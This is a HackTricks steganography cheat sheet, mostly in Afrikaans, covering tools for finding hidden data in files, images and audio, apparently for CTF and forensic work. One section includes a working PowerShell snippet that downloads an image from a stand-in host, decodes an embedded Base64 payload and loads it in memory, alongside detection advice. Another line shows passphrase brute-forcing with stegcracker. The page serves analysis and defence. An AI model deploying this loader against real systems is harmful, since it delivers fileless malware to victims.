# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Uittrekking van data uit lêers**

### **Binwalk**

'n gereedskap om binêre lêers te deursoek vir ingeslote, versteekte lêers en data. Dit word geïnstalleer via `apt` en die bron is beskikbaar op [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Herstel lêers gebaseer op hul kop- en voettekste, nuttig vir png-beelde. Geïnstalleer via `apt` met die bron op [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Help om lêermetaanligting te besigtig, beskikbaar [hier](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Vergelykbaar met exiftool, vir die besigtiging van metadata. Installeerbaar via `apt`, bron op [GitHub](https://github.com/Exiv2/exiv2), en het 'n [amptelike webwerf](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Identifiseer watter tipe lêer jy hanteer.

### **Strings**

Ekstraheer leesbare strings uit lêers deur verskeie enkoderinginstellings te gebruik om die uitvoer te filter.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Vergelyking (cmp)**

Nuttig om 'n gewysigde lêer te vergelyk met die oorspronklike weergawe wat aanlyn gevind is.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Uittrekking van Verborge Data in Teks**

### **Verborge Data in Spasies**

Onsigbare karakters in blykbaar leë spasies kan inligting verberg. Om hierdie data te onttrek, besoek [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Uittrekking van Data uit Beelde**

### **Identifiseer Beeldbesonderhede met GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) word gebruik om beeldlêertipes te bepaal en moontlike korrupsie te identifiseer. Voer die onderstaande kommando uit om 'n beeld te ondersoek:
```bash
./magick identify -verbose stego.jpg
```
Om herstel aan 'n beskadigde beeld te probeer, kan dit help om 'n metadata-opmerking by te voeg:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide vir dataverberging**

Steghide maak dit moontlik om data te versteek in `JPEG, BMP, WAV, and AU` lêers, en kan versleutelde data inkorporeer en onttrek. Installasie is eenvoudig met `apt`, en die [bronkode is beskikbaar op GitHub](https://github.com/StefanoDeVuono/steghide).

**Opdragte:**

- `steghide info file` onthul of 'n lêer verborge data bevat.
- `steghide extract -sf file [--passphrase password]` onttrek die verborge data, wagwoord opsioneel.

Vir web-gebaseerde onttrekking, besoek [hierdie webwerf](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Om password cracking op Steghide te probeer, gebruik [stegcracker](https://github.com/Paradoxis/StegCracker.git) soos volg:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg spesialiseer in die opsporing van versteekte data in PNG- en BMP-lêers. Installasie geskied via `gem install zsteg`, met sy [source on GitHub](https://github.com/zed-0xff/zsteg).

**Opdragte:**

- `zsteg -a file` pas alle detectiemetodes op 'n lêer toe.
- `zsteg -E file` spesifiseer 'n payload vir data-ekstraksie.

### **StegoVeritas and Stegsolve**

**stegoVeritas** kontroleer metadata, voer beeldtransformasies uit, en pas LSB brute forcing toe, onder andere funksies. Gebruik `stegoveritas.py -h` vir 'n volledige lys opsies en `stegoveritas.py stego.jpg` om alle kontroles uit te voer.

**Stegsolve** pas verskeie kleurfilters toe om versteekte teks of boodskappe in beelde te openbaar. Dit is beskikbaar op [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) techniques kan verhulde inhoud in beelde openbaar. Nuttige hulpbronne sluit in:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy laat toe om inligting in beeld- en oudio-lêers in te sluit, en ondersteun formate soos PNG, BMP, GIF, WebP, en WAV. Dit is beskikbaar op [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Om PNG-lêers te analiseer of hul egtheid te verifieer, gebruik:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Aanvullende gereedskap vir beeldanalise**

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-afgebakende Base64 payloads versteek in beelde (malware-aflewering)

Commodity loaders verberg toenemend Base64-encoded payloads as platte teks binne andersins geldige beelde (dikwels GIF/PNG). In plaas van pixel-vlak LSB word die payload afgebaken deur unieke begin/einde merkstringe wat in die lêerteks/metadata ingebed is. Dan doen 'n PowerShell stager die volgende:

- Laai die beeld oor HTTP(S) af
- Vind die marker stringe (waargeneemde voorbeelde: <<sudo_png>> … <<sudo_odt>>)
- Ekstraheer die tussen-teks en Base64-dekodeer dit na bytes
- Laai die .NET assembly in-memory en roep 'n bekende entry method aan (geen lêer word na skyf geskryf nie)

Minimale PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Aantekeninge
- Dit val onder ATT&CK T1027.003 (steganography). Merkerstringe wissel tussen veldtogte.
- Opsporing: sif afgelaaide beelde vir bekende afbakeners; merk `PowerShell` wat `DownloadString` gebruik, gevolg deur `FromBase64String`.

Sien ook phishing-afleweringsvoorbeelde en die volledige in-geheue aanroepvloei hier:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Uittrekking van data uit klanklêers**

**Audio steganography** bied 'n unieke metode om inligting binne klanklêers te versteek. Verskillende gereedskap word gebruik om verborge inhoud in te bed of te onttrek.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide is 'n veelsydige hulpmiddel ontwerp om data in JPEG, BMP, WAV en AU-lêers te verberg. Gedetailleerde instruksies word verskaf in die [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Hierdie hulpmiddel is versoenbaar met verskeie formate, insluitend PNG, BMP, GIF, WebP en WAV. Vir meer inligting, verwys na [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg is noodsaaklik om die integriteit van klanklêers te evalueer, gedetailleerde inligting te verskaf en enige afwykings uit te wys.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg blink uit in die wegsteek en onttrek van data binne WAV-lêers deur die strategie van die minste-belangrike-byt te gebruik. Dit is beskikbaar op [GitHub](https://github.com/ragibson/Steganography#WavSteg). Opdragte sluit in:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound laat enkripsie en opsporing van inligting binne klanklêers toe met AES-256. Dit kan afgelaai word vanaf die [amptelike bladsy](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Sonic Visualizer is 'n onontbeerlike hulpmiddel vir visuele en analytiese inspeksie van klanklêers en kan verborge elemente openbaar wat op ander maniere onopspoorbaar is. Besoek die [amptelike webwerf](https://www.sonicvisualiser.org/) vir meer.

### **DTMF Tones - Dial Tones**

Die opsporing van DTMF-tones in klanklêers kan gedoen word met aanlyn gereedskap soos [hierdie DTMF-detektor](https://unframework.github.io/dtmf-detect/) en [DialABC](http://dialabc.com/sound/detect/index.html).

## **Other Techniques**

### **Binary Length SQRT - QR Code**

Binêre data waarvan die lengte 'n perfekte kwadraat is, kan 'n QR-kode voorstel. Gebruik hierdie snippet om te kontroleer:
```python
import math
math.sqrt(2500) #50
```
Vir die omskakeling van binêre na beelde, kyk na [dcode](https://www.dcode.fr/binary-image). Om QR-kodes te lees, gebruik [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Braille-vertaling**

Vir die vertaling van Braille is die [Branah Braille Translator](https://www.branah.com/braille-translator) 'n uitstekende hulpbron.

## **Verwysings**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
